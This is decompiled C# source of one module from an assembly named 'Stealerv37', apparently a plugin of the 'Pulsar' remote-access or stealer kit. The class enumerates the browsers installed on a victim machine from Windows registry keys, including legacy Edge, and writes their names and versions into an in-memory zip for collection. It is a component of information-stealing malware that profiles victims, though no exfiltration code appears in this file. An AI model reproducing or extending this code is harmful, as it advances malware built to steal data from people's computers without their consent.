// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.InstalledBrowsers
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Device;

public class InstalledBrowsers : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    List<InstalledBrowsers.Browser> list = InstalledBrowsers.GetBrowsers().GroupBy<InstalledBrowsers.Browser, string>((Func<InstalledBrowsers.Browser, string>) (b => b.Name), (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase).Select<IGrouping<string, InstalledBrowsers.Browser>, InstalledBrowsers.Browser>((Func<IGrouping<string, InstalledBrowsers.Browser>, InstalledBrowsers.Browser>) (g => g.First<InstalledBrowsers.Browser>())).ToList<InstalledBrowsers.Browser>();
    int maxName = Math.Max("Name".Length, list.Max<InstalledBrowsers.Browser>((Func<InstalledBrowsers.Browser, int>) (b => b.Name.Length)));
    int maxVersion = Math.Max("Version".Length, list.Max<InstalledBrowsers.Browser>((Func<InstalledBrowsers.Browser, int>) (b => b.Version.Length)));
    int length = "In Use".Length;
    List<string> values = new List<string>()
    {
      $"{"Name".PadRight(maxName)} | {"Version".PadRight(maxVersion)}",
      new string('-', maxName + maxVersion + length + 6)
    };
    values.AddRange(list.Select<InstalledBrowsers.Browser, string>((Func<InstalledBrowsers.Browser, string>) (b =>
    {
      InstalledBrowsers.SafeGetExeName(b.Path);
      return $"{b.Name.PadRight(maxName)} | {b.Version.PadRight(maxVersion)}";
    })));
    if (list.Count <= 0)
      return;
    zip.AddTextFile("InstalledBrowsers.txt", string.Join("\n", (IEnumerable<string>) values));
  }

  private static IEnumerable<InstalledBrowsers.Browser> GetBrowsers()
  {
    string[] strArray = new string[2]
    {
      "SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet",
      "SOFTWARE\\Clients\\StartMenuInternet"
    };
    List<InstalledBrowsers.Browser> browsers = new List<InstalledBrowsers.Browser>();
    foreach (string keyPath in strArray)
    {
      browsers.AddRange(InstalledBrowsers.GetBrowsersFromRegistry(keyPath, Registry.LocalMachine));
      browsers.AddRange(InstalledBrowsers.GetBrowsersFromRegistry(keyPath, Registry.CurrentUser));
    }
    InstalledBrowsers.Browser edgeLegacyVersion = InstalledBrowsers.GetEdgeLegacyVersion();
    if (edgeLegacyVersion != null)
      browsers.Add(edgeLegacyVersion);
    return (IEnumerable<InstalledBrowsers.Browser>) browsers;
  }

  private static IEnumerable<InstalledBrowsers.Browser> GetBrowsersFromRegistry(
    string keyPath,
    RegistryKey root)
  {
    bool browsersFromRegistry;
    using (RegistryKey key = root.OpenSubKey(keyPath))
    {
      if (key == null)
      {
        browsersFromRegistry = false;
      }
      else
      {
        string[] strArray = key.GetSubKeyNames();
        for (int index = 0; index < strArray.Length; ++index)
        {
          RegistryKey subkey = key.OpenSubKey(strArray[index]);
          if (subkey?.GetValue((string) null) is string str)
          {
            string str1 = InstalledBrowsers.StripQuotesFromCommand(subkey.OpenSubKey("shell\\open\\command")?.GetValue((string) null)?.ToString());
            string str2 = "unknown";
            if (!string.IsNullOrEmpty(str1))
            {
              if (File.Exists(str1))
              {
                try
                {
                  str2 = FileVersionInfo.GetVersionInfo(str1).FileVersion;
                }
                catch
                {
                }
              }
            }
            yield return new InstalledBrowsers.Browser()
            {
              Name = str,
              Path = str1,
              Version = str2
            };
            subkey = (RegistryKey) null;
          }
        }
        strArray = (string[]) null;
        browsersFromRegistry = false;
      }
    }
    return browsersFromRegistry;
  }

  private static InstalledBrowsers.Browser GetEdgeLegacyVersion()
  {
    using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas"))
    {
      if (registryKey?.GetValue("PackageFullName") is string input)
      {
        Match match = Regex.Match(input, "\\d+(\\.\\d+)+");
        if (match.Success)
          return new InstalledBrowsers.Browser()
          {
            Name = "Microsoft Edge (Legacy)",
            Path = (string) null,
            Version = match.Value
          };
      }
    }
    return (InstalledBrowsers.Browser) null;
  }

  private static string StripQuotesFromCommand(string command)
  {
    if (string.IsNullOrWhiteSpace(command))
      return (string) null;
    command = command.Trim();
    if (command.StartsWith("\""))
    {
      int num = command.IndexOf('"', 1);
      return num > 1 ? command.Substring(1, num - 1) : (string) null;
    }
    int length = command.IndexOf(' ');
    return length <= 0 ? command : command.Substring(0, length);
  }

  private static string SafeGetExeName(string path)
  {
    try
    {
      return string.IsNullOrWhiteSpace(path) ? (string) null : Path.GetFileName(path)?.ToUpperInvariant();
    }
    catch
    {
      return (string) null;
    }
  }

  private class Browser
  {
    public string Name { get; set; }

    public string Path { get; set; }

    public string Version { get; set; }
  }
}
